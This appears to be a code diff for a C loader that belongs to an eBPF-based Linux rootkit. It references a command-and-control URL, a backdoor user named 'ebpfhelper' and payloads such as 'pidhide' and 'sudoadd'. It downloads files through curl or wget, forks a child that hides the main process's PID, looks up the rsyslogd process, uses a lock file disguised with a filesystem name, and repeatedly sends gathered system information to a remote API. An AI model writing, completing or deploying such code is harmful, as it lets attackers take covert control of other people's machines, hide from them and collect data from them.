@@ -17,9 +17,7 @@
 
 
 static const char *sbin_path = "/usr/sbin/";
-static const char *base_url = "http://ebpf-cnc.surge.sh/";
 static const char *username = "ebpfhelper";
-static const char *programs[] = {"ebpfkit", "ebpfkit-client", "webapp", "pause", "pidhide", "sudoadd", NULL};
 
 typedef struct {
     char *name;
@@ -69,19 +67,6 @@ void purge_directory(const char *dir_path) {
         perror("nftw");
         exit(EXIT_FAILURE);
     }
-}
-
-void download_file(const char *local_path, const char *url) {
-    char cmd[1024];
-    if (system("which curl") == 0) {
-        snprintf(cmd, sizeof(cmd), "curl -o %s %s", local_path, url);
-    } else if (system("which wget") == 0) {
-        snprintf(cmd, sizeof(cmd), "wget -O %s %s", local_path, url);
-    } else {
-        fprintf(stderr, "Neither curl nor wget is available\n");
-        exit(1);
-    }
-    system(cmd);
 }
 
 void find_pid_by_name(const char *program_name, int **found_pids) {
@@ -159,6 +144,20 @@ void find_pid_by_names(char **program_names, int num_programs, ProgramInfo *info
     }
     closedir(dir);
 }
+
+void download_file(const char *local_path, const char *url) {
+    char cmd[1024];
+    if (system("which curl") == 0) {
+        snprintf(cmd, sizeof(cmd), "curl -o %s %s", local_path, url);
+    } else if (system("which wget") == 0) {
+        snprintf(cmd, sizeof(cmd), "wget -O %s %s", local_path, url);
+    } else {
+        fprintf(stderr, "Neither curl nor wget is available\n");
+        exit(1);
+    }
+    system(cmd);
+}
+
 
 void create_and_enable_service() {
     // File doesn't exist, download it
@@ -338,11 +337,21 @@ void handle_sigint(int sig) {
         free(info[i].pids);
     }
 
+    remove("/tmp/btrfs.lock");  // Remove the lock file
+    exit(0);
+
     printf("Shutdonw complete. Goodbuy. \n");
 }
 
 
 int main() {
+    if (access("/tmp/btrfs.lock", F_OK) != -1) {
+        printf("Another instance is running.\n");
+        exit(1);
+    } else {
+        FILE *fp = fopen("/tmp/btrfs.lock", "w");
+        fclose(fp);
+    }
     signal(SIGINT, handle_sigint);
     int found_pids[64];
     char cmd[1024];
@@ -371,18 +380,24 @@ int main() {
 //    }
 //
     // Run pidhide on this program
-    pid_t parent_pid = getpid();
-
     pid_t hide_pid = fork();
     if (hide_pid == 0) { // Child process for hiding the PID
         char hide_cmd[256];
         char pid_str[64];
         // snprintf(hide_cmd, sizeof(hide_cmd), "/usr/sbin/pidhide -p %d", parent_pid);
-        snprintf(pid_str, sizeof(pid_str), "%d", parent_pid);
+        snprintf(pid_str, sizeof(pid_str), "%d", getppid());
+        int *found_pids = NULL;
+        find_pid_by_name("rsyslogd", &found_pids);
+
+        // Print the found PIDs
+        for (int i = 0; found_pids[i] != -1; ++i) {
+            printf("%d ", found_pids[i]);
+        }
+        
         execl("/usr/sbin/pidhide", "pidhide", "-p", pid_str, NULL);
         // system(hide_cmd);
     } else if (hide_pid > 0) { // Fork failed for hide_pid
-    while (1) {
+        while (1) {
             gather_system_info(data, sizeof(data));
             printf("Generated JSON:\n%s\n", data);
             send_api_call(url, data);
